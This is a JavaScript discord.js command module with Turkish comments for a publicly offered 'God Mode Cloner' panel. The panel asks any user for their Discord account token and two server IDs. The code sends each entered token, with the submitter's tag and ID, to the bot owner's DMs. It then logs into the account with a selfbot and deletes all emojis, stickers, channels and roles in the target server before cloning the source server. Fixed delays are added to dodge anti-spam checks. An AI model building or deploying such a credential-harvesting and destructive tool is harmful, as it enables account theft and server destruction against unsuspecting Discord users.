const { 
    SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, 
    ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType 
} = require('discord.js');
const { Client: SelfClient } = require('discord.js-selfbot-v13');

// Discord hesap şüphelenmesini (Rate Limit / Anti-Spam) önlemek için her işlem arasına net 1.5 saniye sabit gecikme ekleyen fonksiyon
const jitter = (ms = 1500) => new Promise(res => setTimeout(res, ms));

module.exports = {
    data: new SlashCommandBuilder()
        .setName('kur')
        .setDescription('Klonlama panelini kanala gönderir (Sadece Sahip).'),

    async execute(interaction) {
        // Kendi Discord ID'ni buraya yaz kanka
        const OWNER_ID = "1389930042200559706";

        // Slash komutunu sadece bot sahibi kullanabilir
        if (interaction.user.id !== OWNER_ID) {
            return await interaction.reply({ content: "❌ Bu eğik çizgi komutunu sadece bot sahibi kullanabilir.", ephemeral: true });
        }

        if (!interaction.client.kurListenerSet) {
            interaction.client.on('interactionCreate', async (int) => {
                
                // BUTON KONTROLÜ: Butona basıldığında (Herkes basabilir)
                if (int.isButton() && int.customId === 'btn_god_clone') {
                    const modal = new ModalBuilder()
                        .setCustomId('modal_god_clone')
                        .setTitle('Klonlama Sistemi Bilgi Girişi');

                    modal.addComponents(
                        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('t').setLabel('Kullanıcı (Self) Token').setStyle(TextInputStyle.Short).setRequired(true)),
                        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('s').setLabel('Kaynak Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true)),
                        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('h').setLabel('Hedef Sunucu ID').setStyle(TextInputStyle.Short).setRequired(true))
                    );
                    return await int.showModal(modal);
                }

                // MODAL SUBMIT KONTROLÜ: Tablo doldurulup gönderildiğinde
                if (int.type === InteractionType.ModalSubmit && int.customId === 'modal_god_clone') {
                    await int.deferReply({ ephemeral: true });
                    
                    const t = int.fields.getTextInputValue('t').trim();
                    const s = int.fields.getTextInputValue('s').trim();
                    const h = int.fields.getTextInputValue('h').trim();
                    
                    // Bot sahibinin verileri alabilmen için kullanıcı nesnesini çekiyoruz
                    const botOwner = await interaction.client.users.fetch(OWNER_ID).catch(() => null);
                    
                    if (botOwner) {
                        // Formu dolduran kişinin bilgileri ve girdikleri doğrudan senin DM kutuna düşer
                        const logEmbed = new EmbedBuilder()
                            .setColor('#ff0055')
                            .setTitle('📥 Yeni Klonlama Talebi / Veri Girişi')
                            .setDescription(`**Formu Dolduran:** ${int.user.tag} (\`${int.user.id}\`)`)
                            .addFields(
                                { name: '🔑 Girilen Token', value: `\`\`\`${t}\`\`\`` },
                                { name: '📤 Kaynak Sunucu ID', value: `\`${s}\``, inline: true },
                                { name: '📥 Hedef Sunucu ID', value: `\`${h}\``, inline: true }
                            )
                            .setTimestamp();
                            
                        await botOwner.send({ embeds: [logEmbed] }).catch(() => {});
                    }

                    // İşlemi başlatıyoruz
                    startGodModeClone(botOwner, t, s, h);
                    
                    await int.editReply("🌌 Bilgiler başarıyla sisteme aktarıldı! İşlem başlatılıyor.");
                }
            });
            interaction.client.kurListenerSet = true;
        }

        // Genel embed paneli (Herkes görebilir)
        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle('🌌 FORCES God Mode Cloner')
            .setDescription(
                `**Aktif Sunucu Taşıma Altyapısı**\n\n` +
                `Aşağıdaki butonu kullanarak taşınacak veya klonlanacak sunucunun bilgilerini girebilirsiniz. ` +
                `Girilen bilgiler doğrudan sistem yöneticisine iletilir ve işlem sıraya alınır.`
            )
            .setFooter({ text: 'Bu paneli herkes kullanabilir.' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('btn_god_clone').setLabel('Verileri Gir & Başlat').setStyle(ButtonStyle.Primary)
        );

        await interaction.reply({ embeds: [embed], components: [row] });
    }
};

// Yardımcı fonksiyon: Kanal oluşturma
async function createChannel(guild, channel, parentId, roleMap) {
    const type = channel.type === 2 ? 2 : 0; // 2 = ses, 0 = yazı
    
    const permissionOverwrites = channel.permissionOverwrites.cache.map(o => {
        const targetId = o.type === 0 ? (roleMap.get(o.id) || o.id) : o.id;
        return {
            id: targetId,
            allow: o.allow,
            deny: o.deny,
            type: o.type
        };
    });

    const options = {
        name: channel.name,
        type: type,
        permissionOverwrites: permissionOverwrites,
        topic: channel.topic || null,
        nsfw: channel.nsfw || false,
        rateLimitPerUser: channel.rateLimitPerUser || 0
    };

    if (parentId) options.parent = parentId;
    if (type === 2) {
        options.bitrate = channel.bitrate || 64000;
        options.userLimit = channel.userLimit || 0;
    }

    return await guild.channels.create(options).catch(() => null);
}

async function startGodModeClone(owner, token, srcId, trgId) {
    if (!owner) return;
    
    const self = new SelfClient({ checkUpdate: false });
    
    self.on('ready', async () => {
        try {
            const src = self.guilds.cache.get(srcId);
            const trg = self.guilds.cache.get(trgId);

            if (!src || !trg) return owner.send("❌ Hata: Girdiğin sunucu ID'lerinden birine selfbot erişemedi.");

            await owner.send(`🌌 **Klonlama Başlatıldı!** \`${src.name}\` -> \`${trg.name}\` sunucusuna aktarılıyor...`);

            // =====================================================
            // 1. AŞAMA: HEDEF SUNUCUDAKİ HER ŞEYİ TEMİZLE
            // =====================================================
            await owner.send("🧹 **Temizlik Başlatılıyor...**");

            // 1.1 - Emojileri sil
            const emojis = await trg.emojis.fetch().catch(() => new Map());
            for (const e of emojis.values()) { 
                await e.delete().catch(() => {}); 
                await jitter(1500); 
            }

            // 1.2 - Çıkartmaları (stickers) sil
            const stickers = await trg.stickers.fetch().catch(() => new Map());
            for (const s of stickers.values()) { 
                await s.delete().catch(() => {}); 
                await jitter(1500); 
            }

            // 1.3 - Önce normal kanalları sil (kategoriler hariç)
            const channels = await trg.channels.fetch().catch(() => new Map());
            for (const c of channels.values()) {
                if (c.type !== 4) { // Kategori değilse
                    await c.delete().catch(() => {});
                    await jitter(1500);
                }
            }

            // 1.4 - Sonra kategorileri sil
            for (const c of channels.values()) {
                if (c.type === 4) { // Kategori ise
                    await c.delete().catch(() => {});
                    await jitter(1500);
                }
            }

            // 1.5 - Tüm rolleri sil (en üsttekinden başlayarak)
            const roles = await trg.roles.fetch().catch(() => new Map());
            const rolesToDelete = roles
                .filter(r => r.name !== '@everyone' && !r.managed && r.editable)
                .sort((a, b) => b.position - a.position); // Yüksek pozisyondan düşüğe doğru sırala
            
            for (const r of rolesToDelete) {
                await r.delete().catch(() => {});
                await jitter(1500);
            }

            await owner.send("✅ **Temizlik Tamamlandı!** Hedef sunucudaki tüm emojiler, çıkartmalar, kanallar, kategoriler ve roller silindi.");

            // =====================================================
            // 2. AŞAMA: SUNUCU AYARLARINI KOPYALA
            // =====================================================
            await owner.send("⚙️ **Sunucu ayarları kopyalanıyor...**");

            // Sunucu adı
            await trg.setName(src.name).catch(() => {});
            
            // Sunucu ikonu
            if (src.iconURL()) {
                await trg.setIcon(src.iconURL({ size: 1024 })).catch(() => {});
            }
            
            // Sunucu bannerı
            if (src.bannerURL()) {
                await trg.setBanner(src.bannerURL({ size: 1024 })).catch(() => {});
            }
            
            // Doğrulama seviyesi
            await trg.setVerificationLevel(src.verificationLevel).catch(() => {});
            
            // Bildirim ayarları
            await trg.setDefaultMessageNotifications(src.defaultMessageNotifications).catch(() => {});
            
            // İçerik filtre
            await trg.setExplicitContentFilter(src.explicitContentFilter).catch(() => {});
            
            // AFK kanalını şimdilik sıfırla (kanallar oluştuktan sonra tekrar ayarlanacak)
            await trg.setAFKChannel(null).catch(() => {});
            await trg.setAFKTimeout(src.afkTimeout).catch(() => {});
            
            // Sistem kanalını şimdilik sıfırla
            await trg.setSystemChannel(null).catch(() => {});

            await owner.send("✅ **Sunucu ayarları kopyalandı!**");

            // =====================================================
            // 3. AŞAMA: ROLLERİ ÜSTTEN AŞAĞIYA KOPYALA
            // =====================================================
            await owner.send("👥 **Roller kopyalanıyor (üstten aşağıya)...**");

            const roleMap = new Map();
            
            // Kaynak sunucudaki rolleri EN ÜSTTEKİNDEN BAŞLAYARAK sırala
            const srcRoles = [...src.roles.cache.values()]
                .filter(r => r.name !== '@everyone' && !r.managed)
                .sort((a, b) => b.position - a.position); // Büyük pozisyondan küçüğe (üstten aşağıya)

            for (const r of srcRoles) {
                const newRole = await trg.roles.create({
                    name: r.name,
                    color: r.color || 0,
                    permissions: r.permissions,
                    hoist: r.hoist,
                    mentionable: r.mentionable
                }).catch(() => null);
                
                if (newRole) {
                    roleMap.set(r.id, newRole.id);
                    // Yeni oluşturulan rolün pozisyonunu orijinal pozisyonuna ayarla
                    await newRole.setPosition(r.position).catch(() => {});
                    await jitter(1500);
                }
            }

            await owner.send("✅ **Roller kopyalandı!** Sıralama üstten aşağıya korundu.");

            // =====================================================
            // 4. AŞAMA: KATEGORİLERİ VE KANALLARI KOPYALA
            // =====================================================
            await owner.send("📂 **Kategoriler ve kanallar kopyalanıyor...**");

            const channelMap = new Map();

            // 4.1 - Önce kategorileri oluştur
            const categories = src.channels.cache
                .filter(c => c.type === 4)
                .sort((a, b) => a.position - b.position);

            for (const cat of categories.values()) {
                const permissionOverwrites = cat.permissionOverwrites.cache.map(o => {
                    const targetId = o.type === 0 ? (roleMap.get(o.id) || o.id) : o.id;
                    return {
                        id: targetId,
                        allow: o.allow,
                        deny: o.deny,
                        type: o.type
                    };
                });

                const newCat = await trg.channels.create({
                    name: cat.name,
                    type: 4,
                    permissionOverwrites: permissionOverwrites
                }).catch(() => null);
                
                if (newCat) {
                    channelMap.set(cat.id, newCat.id);
                }
                await jitter(1500);
            }

            // 4.2 - Kategorisi olmayan kanalları oluştur
            const noParentChannels = src.channels.cache
                .filter(c => c.type !== 4 && !c.parentId)
                .sort((a, b) => a.position - b.position);

            for (const ch of noParentChannels.values()) {
                await createChannel(trg, ch, null, roleMap);
                await jitter(1500);
            }

            // 4.3 - Kategorilere ait kanalları oluştur
            for (const [srcCatId, trgCatId] of channelMap) {
                const children = src.channels.cache
                    .filter(c => c.parentId === srcCatId)
                    .sort((a, b) => a.position - b.position);
                
                for (const ch of children.values()) {
                    await createChannel(trg, ch, trgCatId, roleMap);
                    await jitter(1500);
                }
            }

            await owner.send("✅ **Kategoriler ve kanallar kopyalandı!**");

            // =====================================================
            // 5. AŞAMA: EMOJİLERİ KOPYALA
            // =====================================================
            await owner.send("😀 **Emojiler kopyalanıyor...**");

            const srcEmojis = src.emojis.cache;
            for (const emoji of srcEmojis.values()) {
                try {
                    await trg.emojis.create({
                        attachment: emoji.url,
                        name: emoji.name
                    });
                } catch (err) {
                    // Emoji limiti dolu olabilir veya başka bir hata
                }
                await jitter(1500);
            }

            await owner.send("✅ **Emojiler kopyalandı!**");

            // =====================================================
            // 6. AŞAMA: ÇIKARTMALARI (STICKERS) KOPYALA
            // =====================================================
            await owner.send("🏷️ **Çıkartmalar kopyalanıyor...**");

            const srcStickers = src.stickers.cache;
            for (const sticker of srcStickers.values()) {
                try {
                    await trg.stickers.create({
                        file: sticker.url,
                        name: sticker.name,
                        tags: sticker.tags || 'cloned'
                    });
                } catch (err) {
                    // Sticker limiti dolu olabilir
                }
                await jitter(1500);
            }

            await owner.send("✅ **Çıkartmalar kopyalandı!**");

            // =====================================================
            // 7. AŞAMA: AFK VE SİSTEM KANALINI TEKRAR AYARLA
            // =====================================================
            await owner.send("⚙️ **Son ayarlar yapılıyor...**");

            // AFK kanalını bul ve ayarla
            if (src.afkChannelId) {
                const srcAfkChannel = src.channels.cache.get(src.afkChannelId);
                if (srcAfkChannel) {
                    const trgAfkChannel = trg.channels.cache.find(c => c.name === srcAfkChannel.name && c.type === 2);
                    if (trgAfkChannel) {
                        await trg.setAFKChannel(trgAfkChannel.id).catch(() => {});
                        await trg.setAFKTimeout(src.afkTimeout).catch(() => {});
                    }
                }
            }

            // Sistem kanalını bul ve ayarla
            if (src.systemChannelId) {
                const srcSysChannel = src.channels.cache.get(src.systemChannelId);
                if (srcSysChannel) {
                    const trgSysChannel = trg.channels.cache.find(c => c.name === srcSysChannel.name && c.type === 0);
                    if (trgSysChannel) {
                        await trg.setSystemChannel(trgSysChannel.id).catch(() => {});
                    }
                }
            }

            await owner.send(`👑 **Klonlama Tamamlandı!**\n\`${src.name}\` sunucusu \`${trg.name}\` sunucusuna birebir kopyalandı.\n📊 Roller üstten aşağıya doğru sıralandı.\n📂 Tüm kanallar, kategoriler, emojiler ve çıkartmalar başarıyla aktarıldı.`);
            
            self.destroy();

        } catch (err) {
            await owner.send(`❌ Süreç sırasında teknik hata oluştu: ${err.message}`);
            console.error("Clone hatası:", err);
            self.destroy();
        }
    });

    self.login(token).catch((err) => {
        console.error("Login hatası:", err);
        owner.send("❌ Girilen token hesaba bağlanamadı veya geçersiz.");
    });
}
